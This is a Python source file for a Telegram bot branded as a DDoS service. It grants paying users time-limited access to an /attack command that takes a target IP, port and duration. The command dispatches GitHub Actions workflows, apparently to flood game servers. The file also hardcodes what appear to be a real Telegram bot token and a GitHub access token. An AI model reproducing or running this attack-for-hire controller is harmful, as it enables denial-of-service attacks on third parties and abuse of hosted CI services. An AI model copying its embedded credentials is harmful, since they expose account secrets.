import time
import asyncio
import aiohttp
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram import Update

TELEGRAM_TOKEN = "7683995454:AAFL7EgeDuh1aWDpAzb-106Xe1LJH8XLRPg"
ADMIN_ID = 7008079428

GITHUB_ACCOUNTS = [
    {'token': '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', 'repos': ['sameerkhan078449/DEVELOPER']},

]

approved_users = {}
is_attack_running = False
attack_end_time = 0
current_target = ""

PACKET_SIZE = 64
THREADS = 150

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Only admin can remove users.")
        return
        
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <user_id>")
        return

    try:
        user_id = int(context.args[0])
        
        if user_id == ADMIN_ID:
            await update.message.reply_text("❌ Cannot remove admin.")
            return
            
        if user_id in approved_users:
            del approved_users[user_id]
            await update.message.reply_text(f"✅ USER REMOVED!\n🆔 {user_id}")
        else:
            await update.message.reply_text("❌ User not found.")
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

def is_approved(user_id: int):
    if user_id in approved_users:
        return time.time() < approved_users[user_id]['expiry_time']
    return False

def approve_user(user_id: int, days: int):
    expiry_time = time.time() + (days * 86400)
    approved_users[user_id] = {'expiry_time': expiry_time, 'approved_days': days}

approve_user(ADMIN_ID, 36500)

async def fire_workflow_async(session, token, repo, params):
    try:
        url = f"https://api.github.com/repos/{repo}/actions/workflows/main.yml/dispatches"
        headers = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/vnd.github.v3+json",
            "Content-Type": "application/json"
        }
        async with session.post(url, headers=headers, json=params, timeout=5) as response:
            return response.status == 204
    except:
        return False

async def trigger_all_workflows_async(ip, port, duration):
    params = {
        "ref": "main",
        "inputs": {
            "ip": str(ip),
            "port": str(port),
            "duration": str(duration),
            "packet_size": str(PACKET_SIZE),
            "threads": str(THREADS)
        }
    }
    
    success_count = 0
    tasks = []
    
    async with aiohttp.ClientSession() as session:
        for account in GITHUB_ACCOUNTS:
            token = account['token']
            for repo in account['repos']:
                task = asyncio.create_task(fire_workflow_async(session, token, repo, params))
                tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result and not isinstance(result, Exception):
                success_count += 1
    
    return success_count

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome = """
⚡ SAMEER ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️

🎯 COMMANDS:
/Myid - Check User ID
/attack <ip> <port> <time>
/approve <user_id> <days>
/remove <user_id>

𝐎𝐖𝐍𝐄𝐑 : @SAMEER_VIP_DDOS
    """
    await update.message.reply_text(welcome)

async def Myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    username = update.effective_user.username
    
    if is_approved(user_id):
        expiry_time = approved_users[user_id]['expiry_time']
        approved_days = approved_users[user_id]['approved_days']
        expiry_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(expiry_time))
        
        remaining = expiry_time - time.time()
        remaining_days = int(remaining // 86400)
        remaining_hours = int((remaining % 86400) // 3600)
        
        approval_status = f"✅ APPROVED USER\n📅 {approved_days} days\n⏰ {expiry_str}\n🕒 {remaining_days}d {remaining_hours}h"
    else:
        approval_status = "❌ NOT APPROVED"
    
    user_info = f"👤 USER INFO:\n🆔 {user_id}\n📛 {first_name}\n🔗 @{username if username else 'N/A'}\n\n{approval_status}"
    await update.message.reply_text(user_info)

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only.")
        return
        
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <user_id> <days>")
        return

    try:
        user_id = int(context.args[0])
        days = int(context.args[1])
        
        if days < 1 or days > 30:
            await update.message.reply_text("❌ Days: 1-30 only.")
            return
            
        approve_user(user_id, days)
        expiry_time = approved_users[user_id]['expiry_time']
        expiry_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(expiry_time))
        
        await update.message.reply_text(f"✅ USER APPROVED!\n🆔 {user_id}\n📅 {days} days\n⏰ {expiry_str}")
        
    except ValueError:
        await update.message.reply_text("❌ Invalid numbers.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attack_running, attack_end_time, current_target
    
    if not is_approved(update.effective_user.id):
        await update.message.reply_text("❌ Not approved.")
        return
    
    if is_attack_running:
        remaining_time = attack_end_time - time.time()
        if remaining_time > 0:
            mins = int(remaining_time // 60)
            secs = int(remaining_time % 60)
            
            sent_msg = await update.message.reply_text(f"⚠️ COOLDOWN\n⏳ {mins:02d}:{secs:02d}\n🎯 {current_target}")
            
            while remaining_time > 0:
                await asyncio.sleep(5)
                remaining_time = attack_end_time - time.time()
                if remaining_time <= 0:
                    break
                    
                mins = int(remaining_time // 60)
                secs = int(remaining_time % 60)
                
                try:
                    await sent_msg.edit_text(f"⚠️ COOLDOWN\n⏳ {mins:02d}:{secs:02d}\n🎯 {current_target}")
                except:
                    break
            
            await update.message.reply_text("✅ Cooldown ended!")
        return
        
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return

    try:
        ip = context.args[0]
        port = context.args[1]
        time_int = int(context.args[2])
        
        if time_int < 1 or time_int > 300:
            await update.message.reply_text("❌ Time: 1-300 seconds")
            return
            
    except ValueError:
        await update.message.reply_text("❌ Invalid time. Time must be a number.")
        return

    is_attack_running = True
    attack_end_time = time.time() + time_int
    current_target = f"{ip}:{port}"
    
    attack_msg = f"""
⚡ SAMEER ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️

🚀 ATTACK BY: @MRXYTDM
🎯 TARGET: {ip}
🔌 PORT: {port}
⏰ TIME: {time_int}s

🌎 GAME: BGMI
    """
    await update.message.reply_text(attack_msg)
    
    asyncio.create_task(execute_attack(update, ip, port, time_int))
    
    await asyncio.sleep(10)
    await update.message.reply_text("🔥 Attack Processing Start 🔥")
    
async def execute_attack(update, ip, port, duration):
    global is_attack_running, current_target
    
    try:
        triggered = await trigger_all_workflows_async(ip, port, duration)
        
        await asyncio.sleep(duration)
        
        await update.message.reply_text("✅ ATTACK COMPLETED! 🎯")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Attack error: {e}")
    
    finally:
        is_attack_running = False
        current_target = ""

def main():
    print("""
    ╔══════════════════════════════════════════════╗
    ║    ⚡ SAMEER DDOS BOT STARTING...               ║
    ║    Commands: /attack, /Myid, /approve       ║
    ║    /remove                                  ║
    ║    Owner: @SAMEER                          ║
    ╚══════════════════════════════════════════════╝
    """)
    
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("Myid", Myid))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("attack", attack))
    
    print("✅ Bot started!")
    
    application.run_polling(
        poll_interval=1.0,
        timeout=30,
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES
    )

if __name__ == "__main__":
    while True:
        try:
            main()
        except KeyboardInterrupt:
            print("\n🛑 Bot stopped")
            break
        except Exception as e:
            print(f"⚠️ Bot crashed: {e}")
            print("🔄 Restarting in 10 seconds...")
            time.sleep(10)
            continue